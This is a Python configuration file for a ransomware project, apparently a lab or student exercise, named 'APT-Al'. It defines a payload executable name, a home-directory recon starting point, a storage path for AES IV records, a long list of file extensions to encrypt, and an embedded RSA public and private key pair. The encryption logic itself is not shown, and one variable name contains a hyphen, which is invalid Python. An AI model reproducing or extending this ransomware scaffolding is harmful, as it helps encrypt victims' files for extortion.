import os
from pwd import getpwuid

whoweare = "APT-Al"

# prevent self-encryption
whatismyname = "zararliyim.exe"

# the beginning point of recon
root_directory = os.path.expanduser('~')
root_directory = os.path.join(root_directory,"test")

# where to write the pairs made up of a file and AES IV
aesIV-File_store_path = "/home/kali/desktop"


os_name = os.name


# the extensions are ordered so we can use binary search
file_extentions = [ '7z', 'ai', 'aif', 'apk', 'arj', 'asp', 'aspx', 'avi', 
                    'bak', 'bat', 'bin', 'bmp', 'c', 'cab', 'cda', 'cfg', 
                    'cgi', 'class', 'cpp', 'cs', 'css', 'csv', 'dat', 'db', 
                    'dbf', 'deb', 'dmg', 'doc', 'docx', 'eml', 'exe', 'fnt', 
                    'fon', 'htm', 'html', 'ico', 'iso', 'jar', 'java', 'jpeg', 
                    'jpg', 'js', 'json', 'jsp', 'key', 'log', 'mdb', 'mid', 'midi', 
                    'mov', 'mp3', 'mp4', 'mpa', 'mpg', 'msg', 'msi', 'odp', 
                    'ods', 'oft', 'ogg', 'ost', 'pdf', 'php', 'pkg', 'pl', 
                    'png', 'pps', 'ppt', 'pptx', 'py', 'rar', 'rpm', 'rss', 
                    'rtf', 'sh', 'sql', 'svg', 'swift', 'sys', 'tar', 'tif', 
                    'tiff', 'toast', 'vb', 'wav', 'wma', 'wpl', 'wsf', 'xhtml', 
                    'xls', 'xml', 'xslm', 'xslx', 'zip']



rsa_public_key = "-----BEGIN RSA PUBLIC KEY-----\n\
MIICCgKCAgEAu25ITaLSaYnlJ88w8nWdoJF/q4nrtqH9Iajw1CWlEiSTlUqMy0x+\n\
3uDC29Afv246gSad+fXvS0V22mhnv9ByVk8mTBQCCx7ytR0wLGGSkYl1eSsPAmvV\n\
g59onZgM/aF0vr4MCmYZLqXOabWF6/a8/+qW/v2vA3DJ6ur4N3GEAC26c40YoXqU\n\
nt3Eazzfe5rXMrXPokxaBqfQfzCPVAwwWuTL4VDQINm47cLK4c5RmagQXm3ZvqBg\n\
8j2RMAKZ7xvzw9OCacTEahypcMyyobWSiAsrhNHBl3GsKAne/91LYDmWJUa5tg7q\n\
FBT2M1RvNGezBdV0jDWbUy4KFBS2pr02PWhACLGXZzqAI2isq6fjCJv8tQB7+MWx\n\
fncrreeNQGJ9JqErAZ7IlwlW+NAbn/RQ4OuRLGCIL2IDTkeBN9GKiIqvxOkvtvjR\n\
QKpPHa5tDgMWgmYTsIZrPFUCjbBslQQuYMPLx66rBAr7bNEJZoG4xaAsWHBbvj2r\n\
b4DvLhmsrITAppF9TATh1amnze+Gbupxm68hn+XTecyWFsXz7kIfsycT/OmwW2vm\n\
hjPH7H5Q4TqpxEkDDc3thRcr47wZtiYGeanc/UOsNabxyTahKGPFYooVHaoj9pl5\n\
s+osKiL/Se+8eKHxt9JgP1tUXYMZbfNoo0q0QkIfl3Q8Js+lsOqVP+cCAwEAAQ==\n\
-----END RSA PUBLIC KEY-----"
rsa_private_key = "-----BEGIN RSA PRIVATE KEY-----\n\
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\n\
-----END RSA PRIVATE KEY-----"